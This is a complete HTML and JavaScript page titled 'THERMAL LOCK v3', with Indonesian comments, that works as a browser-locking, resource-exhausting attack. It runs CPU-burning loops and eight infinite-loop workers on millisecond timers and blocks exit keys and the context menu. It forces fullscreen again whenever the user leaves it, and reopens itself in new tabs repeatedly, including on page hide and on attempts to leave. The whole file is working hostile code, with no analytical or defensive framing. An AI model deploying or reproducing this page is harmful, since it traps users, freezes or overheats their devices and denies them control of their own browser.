<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THERMAL LOCK v3</title>
    <style>
        body, html { 
            margin:0; padding:0; overflow:hidden; background:#000; height:100%; 
            touch-action: none; user-select: none; 
        }
        canvas { display:block; position:fixed; top:0; left:0; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 9999; pointer-events: none; background: transparent;
        }
    </style>
</head>
<body>
    <canvas id="c"></canvas>
    <div id="overlay"></div>

    <script>
        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d', { alpha: false });
        let w = canvas.width = window.innerWidth * 2;
        let h = canvas.height = window.innerHeight * 2;

        window.addEventListener('resize', () => {
            w = canvas.width = window.innerWidth * 2;
            h = canvas.height = window.innerHeight * 2;
        });

        let heavyData = new Array(15000000).fill(0).map(() => Math.random() * 1e9);

        function burnCPU() {
            for (let i = 0; i < 25000000; i++) {
                heavyData[i % heavyData.length] = Math.sin(i * 1.3) * Math.cos(i * 2.1) * Math.sqrt(Math.abs(i)) * Math.random();
            }
            let size = 350;
            let a = new Array(size).fill(0).map(() => new Array(size).fill(0).map(Math.random));
            let b = new Array(size).fill(0).map(() => new Array(size).fill(0).map(Math.random));
            let res = new Array(size).fill(0).map(() => new Array(size).fill(0));
            for (let i = 0; i < size; i++)
                for (let j = 0; j < size; j++)
                    for (let k = 0; k < size; k++)
                        res[i][j] += a[i][k] * b[k][j];
        }

        function render() {
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, w, h);
            ctx.strokeStyle = `hsl(${Math.random()*360},100%,70%)`;
            for (let i = 0; i < 15000; i++) {
                let x = Math.random() * w;
                let y = Math.random() * h;
                ctx.beginPath();
                ctx.moveTo(x, y);
                ctx.lineTo(x + (Math.random()-0.5)*200, y + (Math.random()-0.5)*200);
                ctx.stroke();
            }
            ctx.font = 'bold 220px Arial';
            ctx.fillStyle = `rgba(255,${70 + Math.random()*70},0,0.8)`;
            ctx.fillText('THERMAL', Math.random()*w*0.4, Math.random()*h*0.5 + 150);
            ctx.fillText('LOCKED v3', Math.random()*w*0.4, Math.random()*h*0.5 + 400);
            burnCPU();
        }

        function forceFS() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen({ navigationUI: "hide" });
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        }

        // Re-lock fullscreen & immersive
        function lockImmersive() {
            forceFS();
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }
        }

        ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange'].forEach(ev => {
            document.addEventListener(ev, () => {
                if (!document.fullscreenElement) setTimeout(lockImmersive, 10);
            });
        });

        // Blokir semua gesture & input sebanyak mungkin
        document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
        document.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape' || e.keyCode === 27 || e.key === 'Home' || e.key === 'F5') {
                e.preventDefault();
                lockImmersive();
            }
        });

        // Beforeunload + auto reopen
        window.addEventListener('beforeunload', e => {
            e.preventDefault();
            e.returnValue = '';
            try { window.open(window.location.href, '_blank'); } catch(err) {}
            lockImmersive();
            return '';
        });

        // Visibility & pause detection → reopen
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                try { window.open(window.location.href, '_blank'); } catch(err) {}
                lockImmersive();
                burnCPU();
            }
        });

        window.addEventListener('pagehide', () => {
            try { window.open(window.location.href, '_blank'); } catch(err) {}
        });

        // Aggressive intervals
        setInterval(render, 1);
        setInterval(burnCPU, 1);
        setInterval(lockImmersive, 150);
        setInterval(() => {
            try { window.open(window.location.href, '_blank'); } catch(err) {}
        }, 600);

        // Multiple heavy workers
        if (window.Worker) {
            const workerCode = `self.onmessage = function() { while(true) { let x=0; for(let i=0;i<40000000;i++) x += Math.sin(i)*Math.random(); } };`;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            for (let i = 0; i < 8; i++) {
                const worker = new Worker(URL.createObjectURL(blob));
                worker.postMessage('burn');
            }
        }

        function heavyLoop() {
            burnCPU();
            render();
            requestAnimationFrame(heavyLoop);
        }
        heavyLoop(); heavyLoop(); heavyLoop(); heavyLoop();

        // Start
        lockImmersive();
        setTimeout(() => { lockImmersive(); render(); }, 100);

        console.log("%cTHERMAL LOCK v3 ACTIVE - MAXIMUM EXIT BLOCK", "color:#f00;font-size:26px");
    </script>
</body>
</html>
